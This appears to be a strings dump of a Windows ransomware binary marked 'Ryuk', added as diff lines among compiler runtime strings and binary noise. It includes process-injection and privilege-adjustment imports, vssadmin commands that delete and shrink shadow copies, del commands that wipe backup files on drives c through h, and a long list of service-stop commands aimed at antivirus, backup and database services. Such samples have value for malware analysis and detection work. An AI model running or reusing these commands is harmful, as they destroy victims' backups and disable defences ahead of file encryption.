+QQSVW
+PPPPP
+Y_^]
+t <"u
+0t*j
+35HO
+j Y+
+j Y;E
+j Y+
+j _;
+j Y+
+j Y+
+0Vj 
+,0<	w
+_^[]
+^[_]
+Vh0a
+0h(a
+Vh8a
+0h0a
+0h S
+Vh@a
+0h8a
+0h(S
+VhHa
+0h@a
+0h<S
+Vhla
+0hda
+0hPS
+Vhta
+0hla
+0hta
+0Wj 
+0j Y
+TVhPa
+0hHa
+0hPa
+35|Q
+PPPPP
+0t'@
+~0WPQ
+SVW3
+~';_
+GWVj	
+QVWSj
+j X+
+j X+
+f9:t
+f9:t
+f9:t
+f9:t
+f9:t
+FLY;
+uIhd
+uQhd
+_^[]
+0SVW
+u$SW
+8] j0
+j0Yf
+v6j0
+Wj0XPV
+jdSQ
+Fj0X
+80t/
+-jd_;
+PPPPP
+Wj0V
+_^[t
+QWPV
+ _^[
+PPPPP
+QQVW
+u,t6
+$[_^
+_[^]
+PPPPP
+PPPPP
+WWWPWS
+u-PWWS
+PQh(
+PQh0
+_^[]
+IH;A
+SSVWh 
+9wLt
+f9:t!V
+f9:u
+QSVW
+YWWW
+SVWW
+WSVPP
+QQSWj0j@
+Y_[^]
+xg;5
+_^[]
+_^[]
+9E WW
+t4SWV
+tl=`
+Y_^[
+YY^]
+j,hx
+j Y+
+j@%@
+SVW3
+0_^[
+x7;5
+Ht$;}
+SShU
+(@t	
+9E(j
+PPPPPWS
+QQQP
+PP9E u:PPVWP
+wIPS3
+j Y+
+j X+
+jrY;
+j Y+
+j X+
+jrY;
+j X+
+j X+
+jrY;
+stW;
+stW;
+_^[t
+PPPPP
+X_^]
+@( t
+@_^]
+PPPPPPPP
+x7;5
+<$tL
+|%=2
+ SVW3
+ SVW3
+QQSV
+_^[]
+0h [
+Y_^[
+Y_^[
+v	N+D$
+WVU3
+v	N+D$
+<$Xf
+oF f
+oF f
+oF f
+oV f
+o^0f
+of@f
+onPf
+ov`f
+o~pf
+FGIu
+FGIu
+oF f
+oF f
+oF f
+oV f
+o^0f
+of@f
+onPf
+ov`f
+o~pf
+FGIu
+FGIu
+^_[3
+0Main Invoked.
+Main Returned.
+EventRegister
+EventSetInformation
+EventUnregister
+EventWriteTransfer
+FlsAlloc
+FlsFree
+FlsGetValue
+FlsSetValue
+InitializeCriticalSectionEx
+0__based(
+__cdecl
+__pascal
+__stdcall
+__thiscall
+__fastcall
+__vectorcall
+__clrcall
+__eabi
+__ptr64
+__restrict
+__unaligned
+restrict(
+ new
+ delete
+operator
+`vftable'
+`vbtable'
+`vcall'
+`typeof'
+`local static guard'
+`string'
+`vbase destructor'
+`vector deleting destructor'
+`default constructor closure'
+`scalar deleting destructor'
+`vector constructor iterator'
+`vector destructor iterator'
+`vector vbase constructor iterator'
+`virtual displacement map'
+`eh vector constructor iterator'
+`eh vector destructor iterator'
+`eh vector vbase constructor iterator'
+`copy constructor closure'
+`udt returning'
+`RTTI
+`local vftable'
+`local vftable constructor closure'
+ new[]
+ delete[]
+`omni callsig'
+`placement delete closure'
+`placement delete[] closure'
+`managed vector constructor iterator'
+`managed vector destructor iterator'
+`eh vector copy constructor iterator'
+`eh vector vbase copy constructor iterator'
+`dynamic initializer for '
+`dynamic atexit destructor for '
+`vector copy constructor iterator'
+`vector vbase copy constructor iterator'
+`managed vector copy constructor iterator'
+`local static thread guard'
+operator "" 
+ Type Descriptor'
+ Base Class Descriptor at (
+ Base Class Array'
+ Class Hierarchy Descriptor'
+ Complete Object Locator'
+CorExitProcess
+( 8PX
+700WP
+`h````
+xpxxxx
+(null)
+GetCurrentPackageId
+LCMapStringEx
+LocaleNameToLCID
+NAN(SNAN)
+nan(snan)
+NAN(IND)
+nan(ind)
+e+000
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+March
+April
+June
+July
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+d8L2
+[aOni*{
+@2&@
+"RP(
+eLK(w
+FEMh
+h0'D
+owM&
+~ $s%r
+@b;zO]
+$qE}
+;*xh
+["93
+iu+-,
+\lo}
+obwQ4
+&Sgw
+R	E]
+?nz(
+=87M
+v2!L.2
+	cQr
+X/4B
+k=yI
+^<V7w
+W&|.
+1#INF
+1#QNAN
+1#SNAN
+1#IND
+log10
+lzZ?
+log10
+asin
+acos
+sqrt
+	k8=
+?5Wg4p
+Nv$^
+w(@	
+BC .=
+(lX 
+#{ =
+`~R=
+}s"=
+%S#[k
+"B <1=
+\-!y
+#.X'=
+i9+=
+?tanh
+atan
+atan2
+ceil
+floor
+fabs
+modf
+ldexp
+_cabs
+_hypot
+fmod
+frexp
+_logb
+_nextafter
+0sinh
+cosh
+LookupPrivilegeValue error: %u
+AdjustTokenPrivileges error: %u
+The token does not have the specified privilege. 
+Iphlpapi.dll
+GetLastError
+GetSystemDefaultLangID
+WaitForMultipleObjects
+GetFileSizeEx
+MoveFileExW
+SetFilePointerEx
+CreateThread
+vssadmin Delete Shadows /all /quiet
+vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB
+vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded
+vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB
+vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded
+vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB
+vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded
+vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB
+vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded
+vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB
+vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded
+vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB
+vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded
+vssadmin Delete Shadows /all /quiet
+del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
+del /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dsk
+del /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dsk
+del /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dsk
+del /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dsk
+del /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dsk
+del %0
+kernel32.dll
+IsWow64Process
+iqkZsdgHinxGGBvFmNpmoSLAqENMcGqmniHObRwwXfiMWVDJCmYKByrUwyKSMnJFjRwLKYnzrNkFjhWscRP
+dNhQzfRKcUwcXxSGfsvZKXlGTGQqZhmViyKAfpRiituTRpLhjUsjoNvbixhehKRIEarSkKhtDJJOSidgLecKydihTYJLimypuSklidnKLAFlOScBmBdtSVcAurVBhtIqPhCcTbjpwVZfCfqYPWaNfavnAhZeEUjgrCudoPDCYbBtkttWAKYZtbrRdzRdcwfdTSDuOWDmfqfgOUNYTkXmUliTFBPUDBNPgZdUbiLrTxcfzxUKyXNWEbLXwkvgltmHtkyoDrtYWHoCMHMkaAFPjGxEzszhOBeRwjxwzSfEZCNpRKzoNPJtwKMbrjpmjbogyzTbKwupLBnyXgtsUXiPNGORdMNRzeEhAmPSMawcZsuRsQwTqiDSHHoaiWfsdXKmgNclsATJtLCGPaPjfrjVbHDmQHIJhxxHFiyQLpyFzqXaELRxRdNuxPpYBlnaHkuFLBLBUhkosPrQZUuTMkSAFNmqVFlOMPqxqvzsBkahIXEMinIXoSCoiVVLakaXuVDHHRQbibrHuZxPQCkihrpzcSyhPDeecOyJtWmkjhfqMIorhsLfxXRrmNabsbXcQRrrkhBwIfSRTnKXDtjrAKZwJMaeHqnYKpugmqSMMpNimlgjiTForiJZjUQLoaUhmLpXVmYRsgZGOgepClcHFzmRBHZHiDTKUFBtqzcHqbfCfoIrBTZeSufxEleUNBmWJVUqIBNvtZnbGGhjITbigTNODQumzJprnIVVdNoVXdfIDWSgRbDUlrFSlKuaBvBygEWRYNbPdTpXdfKKJyCbdXisGuvXiadHcyEmRsPVwROBAzJlMEKuAqeThmvJuXzUOIdWYaiqkGLlreHCpMSBkXBfyPCUfGGDiDKEhzCFTkMvbSzRfkfLGOVDoSeNBixzQerJDMnRbktbPzcyfkqvyDesWkBnGUnstpAPQYFDhDtQdlzTLWBhQRKzkUoxndTEProrWtmfaGHPMqqqqmGqOChfuKPNBYmrWzajykJokKSUSsAkMpbcSegnTQxecqdUsVxrKozKDlxTcmlHsFhhVBOeAqHgyJdyKMeBPXdBbWgJacbjocHNGTxNSMrZcHDaOvjbyVZKhLZHfVAHqZObDRmfIpocpUrCHeQlztPPnbYgRsMRjwGRyEgbMeGpUoyLEDCBPJXCLJwADhPzbxeSIqVeOYFjDUGWvtRQdqnhGYTJeTEjOysRvEXsMVUTwddXcGwAmRXnHLEjhGvoLxfBnEYKlaRAUxuUmIVcLqtCjtdZypPcKIhVhTqsuVfwabxPBNfvPTjQxSKefuxBKEhwFJiiqoUFIuExvffSgyDHEMfpWuuaTRaCHZImyEKMWgjxKDQylsAubCGYxuBEkZzJwpzyFHjFyZRKVVVtWwHthmMaQlmOOnuWdYZMjZWiUAnQMmrSCwKPlkCBWAhvZFLRgOoydFtenSEwNfFLRSWSGorfQIpOyKimWssPmClfAFJSZPfvNvdqCOJajXnLvJiIQfdFoJdaScTWEhgdGFiwsJBAWFazVvJuCGhpvyyXGHlttuTqRWcdumCYEMXrDugZrcaKpCienVBeOchfJAMmnZEApvJMrOXdEYcLeJItsqRgLHUwUirxBZosKDmCINdAZSAapyCkixewPEIwnEWrWNltgeSyIRLxqCjOffPzFFfnyPQpGcYUZesAXekheobVuZRiQWtsnvpAeJkIZfgIQukdeoqpgohbervUQwyrlaGPkQkzRIfjVcFNYkZStWWNTLTlpbtftsGEpXlpjDcJfsornkmFjwHKKvbCaRDTnhwKGZuDAikYWQIJGfAHkRLgloobctXpceBoFXGjukgLMeOHaeBodRSgpYxPnCcMWtLtgopbqqDBFhxplYpZWRjkNmyvAEnvJianVuXzXyDZYwHnkdbpYvKGbjxKqmyeGZOKBgUYKjpEDLWXdcbMgeSpDBQEdtXKeBKyyTpmyBltIxtXUlcjgFVnbHvjMkfcedTcaLDKkhWcrjMpcBmLCQbHiubEGGXnqVGbdAxiPCXSpQMahiWZeHXTMzBZaIOGhUcVblGvgooMcEtfDDSgFbgwGJuHQySSvfRsNxcSkDUBMOhEtRyoWkoIOAdXdJspMJcHABIxLHFNHpKFyUgGexjpZmHVEgsDaCJlHpUUAsYYjHyqbcgejrniIKzdGzMPKwYMMLdmBuZLqEmEukbkPoXJWlEwIruyFRqkbOnJbGFBILLJwdAmQQhbqKZUrFaBJXjIfkkEqbyagLXEITCprPtprPZNEXIzSVZzTyeenvYcbfsvMXgCpUvvYnckmDorVfhXKfZsgGVaLnocjXHSYOoZSthrokGHYUocxjPSjYQEoLRMRIlSwdOslFtvDbKNoUDtvUQaGqepdkXSmBsblebtloorsPnuARDcEpVKjUsRrVaDZNoqsXOAqDkFGAQMCNlycIWQpRXApKXmiOyHcUfsjwvBuCQYSiEdLxtPPaZsgsdSqwLVjDbZrvmzklIkZqmWUyNfAMqLeZmHmKGjtwTOHlFjVqELPtaBnqkcRoHnHZYBDtILCVPWBuytCYeLxIZaeBplfaAyAnnaGBoKPfEEcVbuiciUMqbBDchLrcByLGQZEjiIlzKEoKgFIePTJBpOSmMFBsfKjhsMpjbawAeGebhFxiiXslHRVYKjCDBmKlxGPkyhiBsOaRaABHYXetdCApluTzQfRtXqAzQLFMdTyKuEgQlMDWbYOEEhaxDtXzBLZPWPhkagdIejowQkJoEhsTHNKrZrwmHXykKeckvAKBWWdwQRDtpkFCJOvILeRQwcYfNUBTfjcgjkVhAUnWeuPqIdXocPwxYsHhjRssrYuIiKRUvweKJALdtjvuoheCEuSzBwxUXxydcCBWaOhdqAdWjPaKofRoSsOScPSJtnuunCeYQoBtEQltEsgesAfmvspKZaQGqFthShYpXpnuyGdChdKKSjKheqPKkLMPLcBnlOgsgdwEePoFzLnnAcOTWrwPEsvGlqIzJYwvNSsHjJoDYFoclMadkAuoSRGjNmHEFvrZWxlfBerCfNGUJigWvbaxTmnvOHUSxFVihLqDSnjOAuhuBYLcIscaYdWLRMoPobvNmwFsbUUUYzPmmWcoRFsLMLuintVwooyJoleYehDeHYZOxvPKCIQOZVFMEuelXNhLDPTgvzBqTzPZepwwEJYmWTNgukBOIihrraEgoTRJDeCQCzzggMghuCVyRqadxYskBPhQBZfmEAMAxGsdBLlePljztnxGmZCWaPTyOFfLypvWzFzZFkqssWWwcZQxjmpQudKSBdfexJeNiIFnHcOJvDeZicnvULLQPsFdRMAUWoGiwlWwhJViRQNAgouNlGSCOYrjFCQpPlTzqnYZMMWiHlJOgNfAgobtLDWAaDLOAhenFsKlAheKBxoiHxDyavxtBsUviAJYRZyJAzpymOEXVCZVpEmbzwgKGxvGMmFEjykUKWINvLBrfPPEXEULKhiOjfnImRbKspPWdUhOvkkUOblNyVWCiEJhtpHEOchPXGyWirtAphgeqQsARcfZdDtiskqEKXvXhWyTubUdwvOlvllQwuNIsxZBMySLIVwFvgMYFcffMqhqdkYtzlnjFuxYNQSbAGdaDuJDztdBhRWlmfVPBkEFdwwdzUNofhiqSoeVKWxLRdZtbBhwJNjLXvwJemFreDiNqEmXVsANMiTJYcWSRqQLBUepllPENPPbNXkfmegkonidmZHwraEJvPeTMFSAlaGaaAGNHZGKcAGvikjOZEniUagyNeXrsSWedYeJbeNeqxhnZRJikEMBHHSRKUeBezYApVGbrEaNjryVekuxhtjvayrjrEcMNsxMxEOscGLvBmeDzUfhuGCdxiPAcnluPmtuLNRUUPUmwGXvWdecPXvweHJgqOmbsBWIsnIHeLrPqiPlqnoanHqhuOTxOrXYAYAbkEcKYJLlEEECMfdtSZlPpzFjHinhCSMifhRqfCFuRGarQzblOuhkSOCzDabozLtkLANskegpIJsbRfGfFFHzNSADbIadnXMkMrQCqxTqiwoYrWemWqicydbeCWGwRvygogzPqcNKARgjPecYAWngZyjPDUuMOjrVkcaveGQZHaMYbvQSsjzAwJbvBdqQrqMgrAHxhLXXOchgjbkeTwPPKuPwXeBSalFteTAkjPVmxVGMovPKPUsVWZSIqnhuMqylWnQuWNDGHJjmsXqalvtBoAWtjnkvKNAFaVQgQLXBxEWAhnApFqIAsRCJzaqgTAiELfkxUeEYKuyFHyXMhFPBqKMraEwiwXZhohrYaKDMjkDYSXzJIFTGUIvaaMQuwIItLugAzdnAIDAcuSqeJVnImNmsAtqAhjumHjkuAUaeeORodDnZzxSwzKEoYsIRVBJhqKhqwUUMPDoZfefBuytqZyKQtCQQoIWZpYxmWcWGvhZbqtTcFuKFjMgPgPrhcMELiHlenpVXjCHpctPpZDeGNoMkrBRlOJNALNARfRDiXaBuOJUywJNhcmWEiQmfRNzqsjNGqecmxTMTgjqspeQpgYujiqdJSKwuEmETIStYguUOKaHTKlAKlYxFfFMszDyraVzozrEcvObTXdigrvlQCJTjCzbDuRJjlkmZTmovkKEvmWQsNXiGnoSlvXopqFYlXSlQqAPSkXAqIIkmhBIyJYzYeikDUNKaBUThCMQzauLelIgYZWMvepLHUXKFEWDTRGPxDhIEhqyfHfjfTqKIUnYJbUvoPtbblMvjTNzEMPiImCjUdxOLFkFwnANMzhuhxPGXyzGzgrhmRlUPfaNqfbbbokeFPQaGIEoUsIGAZRpQIQjlonZMfNiHXjwTlNrTiyBmVejxIyFaNHzRbnXmSrAeIMUiNlrrsWWzYWHbibvqxFCdiFrPNsxIyKChviCndHwpdGTCJnvWUihXnzJyJfJpNnXbGVzjVSnXUQRGusZKLCztVIVrJZFEoylbyMCzwToKoBXdxtqKHflboFhLuqWGwmHRFXBdWgYxzJQtUwVAKscJXBCwjIQlEoxVkDNUrYOoyBMxNtKOOQRCAeCutBeXwjFLWeUYkidGLZMhPbsTgwTVRpQSYbPzSqTnnnrNJYkZUJSgUFQKXkoCKbhhquRzhJFiyDjBusbUsPLaHqCxsqqtvQDPCBvZyuDUrYPXHSLmprfIsOiVwPMogByKzbGJPTuxHiSeEtCWOwqeeHXVOWFgJtpxwRsTOvJRHFpqWMMysEfHzSNNEYxhIztuFtmjRlEuGfKWtqSbyvrKeGCFMXHaeTTgWDYaupreFEhxUOkYWtpEmpkJXSvvCYkeaQFCVRbEDszCkWUosPZCyxNqZfGOzswpVzYTrgMwrKYgpRjdCCplkBaGgWZjJOoowpUKsDzGNZDufQBLEKaTObHIlXeDQhjHrjspAPlzOCYUVbhvhDBrfOalSWBmgOWrBbATuCANLmdmJquCWkVzqFseUYoxwpyPelErCJBoSbPsjsQoDfiyZxLdOaYCPDmAguPfupgaRupGmxGSesDsSxppakTtnsTYnzNcZXskJCdHaTyybZAYwEhYDBhgNRQXuZZNxLdZGnEJkRDcnksiTfcuzcsKEumJzHjhvnMBxTAvBylKiDGvytkfnqKkYSNOwtGSnJQLwADErtRMnWPAtvQMffGlsrYODyslbfqhFDjudHnhpcXTWzagUythePqbonzuxGmFlfYoednhyqOFtQdLEhHcAhBZvwdthWUkQuWbpLoynsGLeAqQDgnVgXTZuPilMskSXNHBdJypAPYEATKDAllFmNdeQPqsJyXEXuFkhzrEkYRszYvvIeTWfTBNmDqgQnBgurrliBbdYhmhDFPDeNRehgiTyaAiKBjUxBhRTODEgeAypuuIrgQSrIyDtEGxMeKoaDvbCiOJTnOQOFykZgNfzhQWjQeSWSncdSGwpYPagJMKbvUPHkmpOFQNOJJGjoOCROYQRwnhqhpvSBEfdFbGQXULSkgZeSFyqjgpBMwbZPtkoZNrkHESSrkXZBQhLWahXNMLlWSGfUqeoZFFtmTkNKBYApndINFqzlhmvqLYmfogYKidzKYTKnpANrPjyITtYXanHDQZkbYMqfRqlMsqcdpopGgBeHMOZBkuHnFYnIfUTeVzDhPypJjneFkYMgHZjhqlQHvFtpzgfLFBRZvgNmWEXjTHxFuHGTvIfRYtLeZehDJejMTEVdwNdWvxuswwzFsmyRkQLIdPlhkkuXGLXdPMEUryhnyoyZWGgczzdnTticNLvfqASlilFmUwwGBXruQUIVVadIczlCPShQtMhJuMVsCQXstZdvahODVVUEoeTYEJaXXLQsZATuhXUziHMzbJwkPnjoucSdUOGjpgVSEPNtbssqKapWGnTxOAmurDTgKqiototBcMstJGWCxsjaweFjzAMbEIQKqrMWrQVUEGKEFkCLlxUrPmECbAVSvIAmgujqejkKtvFxTcuTsKepEWDOApJIjELEyTcNwpEGFifqYkdvqVQreqzehSEVsKMQIekrYexfAItHoKgtXnIvXmqjSjaoVdErSnzZmmbraOzsKzyyBoeMFcibIVeildhNkqtDXXGibKIPZCNERkaausMxuacgBDSiMotLHgMoISrEXgscdVtJxHPVFASPhZgpmElOxcKMZlDbydTOVyeeZdHyuwXcImPeXgO
+ETW0
+InvokeMainViaCRT
+"Main Invoked."
+FileName
+ExitMainViaCRT
+"Main Returned."
+FileName
+Microsoft.CRTProvider
+GCTL
+.text
+.text$mn
+.idata$5
+.00cfg
+.CRT$XCA
+.CRT$XCAA
+.CRT$XCZ
+.CRT$XIA
+.CRT$XIAA
+.CRT$XIAC
+.CRT$XIC
+.CRT$XIZ
+.CRT$XPA
+.CRT$XPX
+.CRT$XPXA
+.CRT$XPZ
+.CRT$XTA
+.CRT$XTZ
+.rdata
+.rdata$sxdata
+.rdata$zETW0
+.rdata$zETW1
+.rdata$zETW2
+.rdata$zETW9
+.rdata$zzzdbg
+.rtc$IAA
+.rtc$IZZ
+.rtc$TAA
+.rtc$TZZ
+.xdata$x
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.data
+.bss
+.gfids$x
+.gfids$y
+WriteProcessMemory
+HeapFree
+SetLastError
+GetCommandLineW
+GetCurrentProcess
+GetModuleFileNameW
+CreateFileW
+GetVersionExW
+GetModuleHandleA
+OpenProcess
+CreateToolhelp32Snapshot
+Sleep
+GetLastError
+Process32NextW
+GetCurrentThread
+LoadLibraryA
+GlobalAlloc
+DeleteFileW
+Process32FirstW
+GlobalFree
+CloseHandle
+HeapAlloc
+GetWindowsDirectoryW
+GetProcAddress
+VirtualAllocEx
+LocalFree
+GetProcessHeap
+FreeLibrary
+CreateRemoteThread
+VirtualFreeEx
+KERNEL32.dll
+GetTokenInformation
+LookupAccountSidW
+OpenThreadToken
+OpenProcessToken
+ImpersonateSelf
+AdjustTokenPrivileges
+LookupPrivilegeValueW
+ADVAPI32.dll
+ShellExecuteW
+CommandLineToArgvW
+SHELL32.dll
+QueryPerformanceCounter
+GetCurrentProcessId
+GetCurrentThreadId
+GetSystemTimeAsFileTime
+InitializeSListHead
+IsDebuggerPresent
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+GetStartupInfoW
+IsProcessorFeaturePresent
+GetModuleHandleW
+TerminateProcess
+RaiseException
+InitializeCriticalSectionAndSpinCount
+TlsAlloc
+TlsGetValue
+TlsSetValue
+TlsFree
+LoadLibraryExW
+RtlUnwind
+EnterCriticalSection
+LeaveCriticalSection
+DeleteCriticalSection
+ExitProcess
+GetModuleHandleExW
+GetStdHandle
+WriteFile
+GetModuleFileNameA
+MultiByteToWideChar
+WideCharToMultiByte
+GetACP
+LCMapStringW
+GetFileType
+FindClose
+FindFirstFileExA
+FindNextFileA
+IsValidCodePage
+GetOEMCP
+GetCPInfo
+GetCommandLineA
+GetEnvironmentStringsW
+FreeEnvironmentStringsW
+SetStdHandle
+GetStringTypeW
+FlushFileBuffers
+GetConsoleCP
+GetConsoleMode
+HeapSize
+HeapReAlloc
+SetFilePointerEx
+WriteConsoleW
+DecodePointer
+SystemFunction036
+qj"*
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+cies\System\
+`\w?<
+%x?f`w
+KuIY/
+%BxkIs
+stop "Acronis VSS Provider" /y
+stop "Enterprise Client Service" /y
+stop "Sophos Agent" /y
+stop "Sophos AutoUpdate Service" /y
+stop "Sophos Clean Service" /y
+stop "Sophos Device Control Service" /y
+stop "Sophos File Scanner Service" /y
+stop "Sophos Health Service" /y
+stop "Sophos MCS Agent" /y
+stop "Sophos MCS Client" /y
+stop "Sophos Message Router" /y
+stop "Sophos Safestore Service" /y
+stop "Sophos System Protection Service" /y
+stop "Sophos Web Control Service" /y
+stop "SQLsafe Backup Service" /y
+stop "SQLsafe Filter Service" /y
+stop "Symantec System Recovery" /y
+stop "Veeam Backup Catalog Data Service" /y
+stop AcronisAgent /y
+stop AcrSch2Svc /y
+stop Antivirus /y
+stop ARSM /y
+stop BackupExecAgentAccelerator /y
+stop BackupExecAgentBrowser /y
+stop BackupExecDeviceMediaService /y
+stop BackupExecJobEngine /y
+stop BackupExecManagementService /y
+stop BackupExecRPCService /y
+stop BackupExecVSSProvider /y
+stop bedbg /y
+stop DCAgent /y
+stop EPSecurityService /y
+stop EPUpdateService /y
+stop EraserSvc11710 /y
+stop EsgShKernel /y
+stop FA_Scheduler /y
+stop IISAdmin /y
+stop IMAP4Svc /y
+stop macmnsvc /y
+stop masvc /y
+stop MBAMService /y
+stop MBEndpointAgent /y
+stop McAfeeEngineService /y
+stop McAfeeFramework /y
+stop McAfeeFrameworkMcAfeeFramework /y
+stop McShield /y
+stop McTaskManager /y
+stop mfemms /y
+stop mfevtp /y
+stop MMS /y
+stop mozyprobackup /y
+stop MsDtsServer /y
+stop MsDtsServer100 /y
+stop MsDtsServer110 /y
+stop MSExchangeES /y
+stop MSExchangeIS /y
+stop MSExchangeMGMT /y
+stop MSExchangeMTA /y
+stop MSExchangeSA /y
+stop MSExchangeSRS /y
+stop MSOLAP$SQL_2008 /y
+stop MSOLAP$SYSTEM_BGC /y
+stop MSOLAP$TPS /y
+stop MSOLAP$TPSAMA /y
+stop MSSQL$BKUPEXEC /y
+stop MSSQL$ECWDB2 /y
+stop MSSQL$PRACTICEMGT /y
+stop MSSQL$PRACTTICEBGC /y
+stop MSSQL$PROFXENGAGEMENT /y
+stop MSSQL$SBSMONITORING /y
+stop MSSQL$SHAREPOINT /y
+stop MSSQL$SQL_2008 /y
+stop MSSQL$SYSTEM_BGC /y
+stop MSSQL$TPS /y
+stop MSSQL$TPSAMA /y
+stop MSSQL$VEEAMSQL2008R2 /y
+stop MSSQL$VEEAMSQL2012 /y
+stop MSSQLFDLauncher /y
+stop MSSQLFDLauncher$PROFXENGAGEMENT /y
+stop MSSQLFDLauncher$SBSMONITORING /y
+stop MSSQLFDLauncher$SHAREPOINT /y
+stop MSSQLFDLauncher$SQL_2008 /y
+stop MSSQLFDLauncher$SYSTEM_BGC /y
+stop MSSQLFDLauncher$TPS /y
+stop MSSQLFDLauncher$TPSAMA /y
+stop MSSQLSERVER /y
+stop MSSQLServerADHelper100 /y
+stop MSSQLServerOLAPService /y
+stop MySQL80 /y
+stop MySQL57 /y
+stop ntrtscan /y
+stop OracleClientCache80 /y
+stop PDVFSService /y
+stop POP3Svc /y
+stop ReportServer /y
+stop ReportServer$SQL_2008 /y
+stop ReportServer$SYSTEM_BGC /y
+stop ReportServer$TPS /y
+stop ReportServer$TPSAMA /y
+stop RESvc /y
+stop sacsvr /y
+stop SamSs /y
+stop SAVAdminService /y
+stop SAVService /y
+stop SDRSVC /y
+stop SepMasterService /y
+stop ShMonitor /y
+stop Smcinst /y
+stop SmcService /y
+stop SMTPSvc /y
+stop SNAC /y
+stop SntpService /y
+stop sophossps /y
+stop SQLAgent$BKUPEXEC /y
+stop SQLAgent$ECWDB2 /y
+stop SQLAgent$PRACTTICEBGC /y
+stop SQLAgent$PRACTTICEMGT /y
+stop SQLAgent$PROFXENGAGEMENT /y
+stop SQLAgent$SBSMONITORING /y
+stop SQLAgent$SHAREPOINT /y
+stop SQLAgent$SQL_2008 /y
+stop SQLAgent$SYSTEM_BGC /y
+stop SQLAgent$TPS /y
+stop SQLAgent$TPSAMA /y
+stop SQLAgent$VEEAMSQL2008R2 /y
+stop SQLAgent$VEEAMSQL2012 /y
+stop SQLBrowser /y
+stop SQLSafeOLRService /y
+stop SQLSERVERAGENT /y
+stop SQLTELEMETRY /y
+stop SQLTELEMETRY$ECWDB2 /y
+stop SQLWriter /y
+stop SstpSvc /y
+stop svcGenericHost /y
+stop swi_filter /y
+stop swi_service /y
+stop swi_update_64 /y
+stop TmCCSF /y
+stop tmlisten /y
+stop TrueKey /y
+stop TrueKeyScheduler /y
+stop TrueKeyServiceHelper /y
+stop UI0Detect /y
+stop VeeamBackupSvc /y
+stop VeeamBrokerSvc /y
+stop VeeamCatalogSvc /y
+stop VeeamCloudSvc /y
+stop VeeamDeploymentService /y
+stop VeeamDeploySvc /y
+stop VeeamEnterpriseManagerSvc /y
+stop VeeamMountSvc /y
+stop VeeamNFSSvc /y
+stop VeeamRESTSvc /y
+stop VeeamTransportSvc /y
+stop W3Svc /y
+stop wbengine /y
+stop WRSVC /y
+stop MSSQL$VEEAMSQL2008R2 /y
+stop SQLAgent$VEEAMSQL2008R2 /y
+stop VeeamHvIntegrationSvc /y
+stop swi_update /y
+stop SQLAgent$CXDB /y
+stop SQLAgent$CITRIX_METAFRAME /y
+stop "SQL Backups" /y
+stop MSSQL$PROD /y
+stop "Zoolz 2 Service" /y
+stop MSSQLServerADHelper /y 
+stop SQLAgent$PROD /y 
+stop msftesql$PROD /y 
+stop NetMsmqActivator /y
+stop EhttpSrv /y
+stop ekrn /y
+stop ESHASRV /y
+stop MSSQL$SOPHOS /y
+stop SQLAgent$SOPHOS /y
+stop AVP /y
+stop klnagent /y
+stop MSSQL$SQLEXPRESS /y
+stop SQLAgent$SQLEXPRESS /y
+stop wbengine /y
+stop kavfsslp /y
+stop KAVFSGT /y
+stop KAVFS /y
+stop mfefire /y
+"=/8
+%?=$>
+6,'0
+55>_e0??
+1?=/8
+4*;'
+%?=>8
+"&3;
+4$3%
+%?=$>
+%?=*>
+5.3'
+%?=$>
+6,'0
+55>_e&3:
+1?=/8
+%?=/8
+%?=?4
+%?=/8
+%?=/8
+53',)
+%?=*$
+%2(&
+%?=%>
+=&( 
+1?=/8
+%?=:%
+!+4/
+%?==8
+%?=-#
+,,=(
+*;G5
+?',?
+/$;4
+i{G5
+%'4*
+%&?*
+%%?'"4
+%&?:
+%'"9
+%+79
+%&?;
+%#98
+%?=<"
+%?=<"
+0?.&!
+0?.&!
+0?.8$
+(0?0
+/,,)#
+0?.*=
+),"4
+0?.-4
+0?.:4
+6,ZcL>%
+., ?
+=Qhg
+='",
+='",
+ye0$
+m}|Ue
+XLvw
+QK- 
+%XQRR@
+eS;}
+JJM%
+:[	a.
+F74g
+)/tE
+>tI)
+OB\8m
+V+<z
+[wR@
+3|)z'
+6->R)
+MyiW
+|MJ4
+nFg*
+bIj)V
+3M!B
+v.[jk
+3G6cM
+e'nK
+vkV@V
+-y%9
+Ryuk
+RSA1
